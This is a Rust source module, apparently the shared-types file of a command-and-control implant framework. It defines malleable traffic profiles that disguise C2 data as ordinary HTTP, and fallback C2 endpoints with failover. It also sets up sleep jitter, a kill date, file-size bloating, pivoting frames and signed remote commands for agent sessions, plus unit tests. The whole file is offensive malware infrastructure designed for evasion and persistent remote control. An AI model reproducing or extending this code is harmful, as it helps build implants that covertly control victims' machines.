// src/common.rs
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use tokio::sync::{mpsc, oneshot};
use std::net::SocketAddr;
use std::sync::Arc;
use std::collections::HashMap;
use dashmap::DashMap;
use ed25519_dalek::SigningKey;

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum TransportProtocol {
    #[serde(rename = "tls")]
    Tls,
    #[serde(rename = "tcp_plain")]
    TcpPlain,
    #[serde(rename = "named_pipe")]
    NamedPipe,
    #[serde(rename = "http")]
    Http,
    #[serde(rename = "https")]
    Https,
}

impl Default for TransportProtocol {
    fn default() -> Self { TransportProtocol::Tls }
}

/// Proxy configuration for HTTP(S) transport.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProxyConfig {
    /// Use system proxy settings (default: true)
    #[serde(default = "default_true")]
    pub use_system: bool,
    /// Explicit proxy URL (e.g. "http://proxy.corp.com:8080")
    #[serde(default)]
    pub url: String,
    /// Proxy username for Basic/NTLM auth
    #[serde(default)]
    pub username: String,
    /// Proxy password
    #[serde(default)]
    pub password: String,
}

impl Default for ProxyConfig {
    fn default() -> Self {
        Self {
            use_system: true,
            url: String::new(),
            username: String::new(),
            password: String::new(),
        }
    }
}

fn default_true() -> bool { true }

// [NEW] Transformation Steps for Data
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum TransformStep {
    #[serde(rename = "base64")]
    Base64,
    #[serde(rename = "hex")]
    Hex,
    #[serde(rename = "mask")]
    Mask(Vec<u8>), // Per-profile XOR key (multi-byte)
    #[serde(rename = "prepend")]
    Prepend(String),
    #[serde(rename = "append")]
    Append(String),
}

// [NEW] HTTP Configuration Block (GET/POST)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct HttpBlock {
    pub uris: Vec<String>,
    pub headers: HashMap<String, String>,
    pub data_transform: Vec<TransformStep>, // How to process C2 data before sending
}

impl Default for HttpBlock {
    fn default() -> Self {
        HttpBlock {
            uris: vec!["/default".into()],
            headers: HashMap::new(),
            data_transform: vec![],
        }
    }
}

// [NEW] The Malleable Profile Root
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct MalleableProfile {
    pub name: String,
    pub user_agent: String,
    pub http_get: HttpBlock,
    pub http_post: HttpBlock,
    // Determines if we strictly enforce HTTP/1.1 formatting over the raw stream
    pub format_http: bool, 
}

impl Default for MalleableProfile {
    fn default() -> Self {
        MalleableProfile {
            name: "default".into(),
            user_agent: "Mozilla/5.0".into(),
            http_get: HttpBlock::default(),
            http_post: HttpBlock::default(),
            format_http: false, // Default is raw TCP
        }
    }
}

// ── Fallback Endpoint Configuration ─────────────────────────────────────

/// A single C2 endpoint the agent can connect to.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FallbackEndpoint {
    pub host: String,
    pub port: u16,
    #[serde(default)]
    pub transport: TransportProtocol,
    /// Optional per-endpoint malleable profile override.
    #[serde(default)]
    pub profile: Option<MalleableProfile>,
    /// Optional per-endpoint proxy override.
    #[serde(default)]
    pub proxy: Option<ProxyConfig>,
    /// Priority (lower = tried first in Priority/Failover strategies).
    #[serde(default)]
    pub priority: u32,
    /// Weight for Random strategy (higher = more likely).
    #[serde(default = "default_weight")]
    pub weight: u32,
    /// Mark endpoint dead after this many consecutive failures.
    #[serde(default = "default_max_failures")]
    pub max_failures: u32,
}

fn default_weight() -> u32 { 1 }
fn default_max_failures() -> u32 { 5 }

/// Strategy for selecting which endpoint to try.
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum FallbackStrategy {
    /// Cycle through endpoints in order, looping back to start.
    #[serde(rename = "round_robin")]
    RoundRobin,
    /// Pick a random endpoint, weighted by `weight` field.
    #[serde(rename = "random")]
    Random,
    /// Always try lowest-priority first; fall to next on failure.
    #[serde(rename = "priority")]
    Priority,
    /// Use first endpoint until it fails N times, then move to next permanently.
    #[serde(rename = "failover")]
    Failover,
}

impl Default for FallbackStrategy {
    fn default() -> Self { FallbackStrategy::Priority }
}

/// Full fallback configuration.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct FallbackConfig {
    #[serde(default)]
    pub endpoints: Vec<FallbackEndpoint>,
    #[serde(default)]
    pub strategy: FallbackStrategy,
    /// Seconds to skip a dead endpoint before retrying it.
    #[serde(default = "default_dead_time")]
    pub dead_time_secs: u64,
}

fn default_dead_time() -> u64 { 300 }

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct C2Config {
    #[serde(default)]
    pub transport: TransportProtocol,
    
    #[serde(default)]
    pub profile: MalleableProfile, 

    #[serde(default)]
    pub proxy: ProxyConfig,

    /// Fallback endpoints. If empty, `c2_host`/`tunnel_port` is the only endpoint.
    #[serde(default)]
    pub fallback: FallbackConfig,

    pub server_public_key: String,
    pub hash_salt: String,
    /// Primary endpoint host (always used as first fallback if fallback.endpoints is empty).
    pub c2_host: String,
    pub build_id: String,
    /// Primary endpoint port.
    pub tunnel_port: u16,
    pub sleep_interval: u64,
    pub jitter_min: u32,
    pub jitter_max: u32,
    #[serde(default)]
    pub bloat_mb: u64,
    #[serde(default)]
    pub debug: bool,
    #[serde(default)]
    pub kill_date: Option<i64>,
    /// Per-build shared secret for handshake authentication (base64).
    /// Agent proves knowledge of this key via HMAC during session setup.
    #[serde(default)]
    pub challenge_key: String,
}

// ... (Rest of common.rs remains the same: ClientHello, SecuredCommand, etc.)
#[derive(Serialize, Deserialize, Debug)]
pub struct ClientHello {
    pub hostname: String,
    pub os: String,
    pub computer_id: String,
    pub exe_id: String,
    pub build_id: String,
    /// HMAC-SHA256(challenge_key, build_id || exe_id || reg_timestamp) — proves
    /// agent has the build secret. Includes a timestamp to prevent replay attacks.
    /// Empty string for legacy builds without challenge_key.
    #[serde(default)]
    pub auth_hmac: String,
    /// ISO-8601 registration timestamp included in the HMAC to prevent replays.
    #[serde(default)]
    pub reg_timestamp: String,
}

/// Server sends this after receiving ClientHello to prove it holds the
/// signing key and to challenge the agent to prove it has the build secret.
#[derive(Serialize, Deserialize, Debug)]
pub struct HandshakeChallenge {
    pub nonce: String,           // Random 32-byte hex
    pub server_proof: String,    // ed25519 signature of nonce (proves server has private key)
}

/// Agent responds with HMAC proof that it holds the challenge_key.
#[derive(Serialize, Deserialize, Debug)]
pub struct HandshakeResponse {
    pub hmac: String, // HMAC-SHA256(challenge_key, nonce || build_id), base64
}

#[derive(Serialize, Deserialize, Debug)]
pub struct SecuredCommand {
    pub session_id: String,
    pub counter: u64,
    pub nonce: u64,
    pub timestamp: DateTime<Utc>,
    pub command: String,
    pub signature: String,
}

impl SecuredCommand {
    pub fn get_signable_bytes(&self) -> Vec<u8> {
        format!("{}:{}:{}:{}:{}", 
            self.session_id, self.counter, self.nonce, 
            self.timestamp.to_rfc3339(), self.command
        ).into_bytes()
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandResponse {
    pub request_id: u64,
    pub output: String,
    pub error: String,
    pub exit_code: i32,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PivotFrame {
    pub stream_id: u32,
    pub destination: u32,
    pub source: u32,
    pub data: Vec<u8>,
    #[serde(default)]
    pub metadata: String,
}

/// Hard maximum frame size for length-prefixed transport (10 MB).
/// A malformed length prefix above this causes immediate rejection.
pub const MAX_FRAME_SIZE: usize = 10 * 1024 * 1024;

/// Soft warning threshold. Frames above this are logged but accepted.
pub const FRAME_WARN_SIZE: usize = 2 * 1024 * 1024;

pub struct Session {
    pub id: u32,
    pub computer_id: String,
    pub addr: SocketAddr,
    pub hostname: String,
    pub os: String,
    pub tx: mpsc::UnboundedSender<(String, Option<oneshot::Sender<u64>>)>,
    pub signing_key: SigningKey,
    pub parent_id: Option<u32>,
    pub last_seen: Arc<std::sync::atomic::AtomicI64>,
}

impl Session {
    pub fn touch(&self) {
        let now = chrono::Utc::now().timestamp();
        self.last_seen.store(now, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn seconds_since_seen(&self) -> i64 {
        let now = chrono::Utc::now().timestamp();
        let last = self.last_seen.load(std::sync::atomic::Ordering::Relaxed);
        now - last
    }
}

pub type SharedSessions = Arc<DashMap<u32, Session>>;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_secured_command_signable_bytes_deterministic() {
        let cmd = SecuredCommand {
            session_id: "sess1".to_string(),
            counter: 42,
            nonce: 12345,
            timestamp: chrono::DateTime::parse_from_rfc3339("2024-01-15T10:30:00+00:00").unwrap().with_timezone(&chrono::Utc),
            command: "whoami".to_string(),
            signature: String::new(),
        };
        let bytes1 = cmd.get_signable_bytes();
        let bytes2 = cmd.get_signable_bytes();
        assert_eq!(bytes1, bytes2);
        assert!(!bytes1.is_empty());
    }

    #[test]
    fn test_secured_command_different_commands_different_bytes() {
        let base = SecuredCommand {
            session_id: "s".to_string(), counter: 1, nonce: 1,
            timestamp: chrono::Utc::now(), command: "cmd1".to_string(), signature: String::new(),
        };
        let mut other = SecuredCommand {
            session_id: "s".to_string(), counter: 1, nonce: 1,
            timestamp: base.timestamp, command: "cmd2".to_string(), signature: String::new(),
        };
        assert_ne!(base.get_signable_bytes(), other.get_signable_bytes());
    }

    #[test]
    fn test_transport_protocol_serialization() {
        let tls = serde_json::to_string(&TransportProtocol::Tls).unwrap();
        assert_eq!(tls, "\"tls\"");
        let http = serde_json::to_string(&TransportProtocol::Https).unwrap();
        assert_eq!(http, "\"https\"");
        let rt: TransportProtocol = serde_json::from_str("\"http\"").unwrap();
        assert_eq!(rt, TransportProtocol::Http);
    }

    #[test]
    fn test_fallback_strategy_serialization() {
        let s = serde_json::to_string(&FallbackStrategy::RoundRobin).unwrap();
        assert_eq!(s, "\"round_robin\"");
        let rt: FallbackStrategy = serde_json::from_str("\"failover\"").unwrap();
        assert_eq!(rt, FallbackStrategy::Failover);
    }

    #[test]
    fn test_c2config_deserialize_minimal() {
        let json = r#"{
            "transport": "tls",
            "server_public_key": "abc",
            "hash_salt": "xyz",
            "c2_host": "10.0.0.1",
            "build_id": "test",
            "tunnel_port": 4443,
            "sleep_interval": 30,
            "jitter_min": 10,
            "jitter_max": 20
        }"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert_eq!(config.c2_host, "10.0.0.1");
        assert_eq!(config.tunnel_port, 4443);
        assert!(config.fallback.endpoints.is_empty());
        assert_eq!(config.fallback.strategy, FallbackStrategy::Priority);
    }

    #[test]
    fn test_c2config_deserialize_with_fallback() {
        let json = r#"{
            "transport": "https",
            "server_public_key": "", "hash_salt": "", "c2_host": "primary.com",
            "build_id": "b1", "tunnel_port": 443, "sleep_interval": 5,
            "jitter_min": 0, "jitter_max": 0,
            "fallback": {
                "strategy": "round_robin",
                "dead_time_secs": 120,
                "endpoints": [
                    {"host": "a.com", "port": 443, "transport": "https"},
                    {"host": "b.com", "port": 8443, "transport": "tls", "priority": 5}
                ]
            }
        }"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert_eq!(config.fallback.endpoints.len(), 2);
        assert_eq!(config.fallback.strategy, FallbackStrategy::RoundRobin);
        assert_eq!(config.fallback.endpoints[1].priority, 5);
    }

    #[test]
    fn test_malleable_profile_default() {
        let p = MalleableProfile::default();
        assert_eq!(p.name, "default");
        assert!(!p.format_http);
        assert!(!p.http_get.uris.is_empty());
    }

    #[test]
    fn test_proxy_config_default() {
        let p = ProxyConfig::default();
        assert!(p.use_system);
        assert!(p.url.is_empty());
    }

    #[test]
    fn test_session_last_seen() {
        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
        let session = Session {
            id: 1, computer_id: "test".into(), addr: "127.0.0.1:1234".parse().unwrap(),
            hostname: "test".into(), os: "linux".into(), tx,
            signing_key: ed25519_dalek::SigningKey::from_bytes(&[0u8; 32]),
            parent_id: None,
            last_seen: std::sync::Arc::new(std::sync::atomic::AtomicI64::new(chrono::Utc::now().timestamp())),
        };
        assert!(session.seconds_since_seen() < 2);
        session.touch();
        assert!(session.seconds_since_seen() < 2);
    }
}
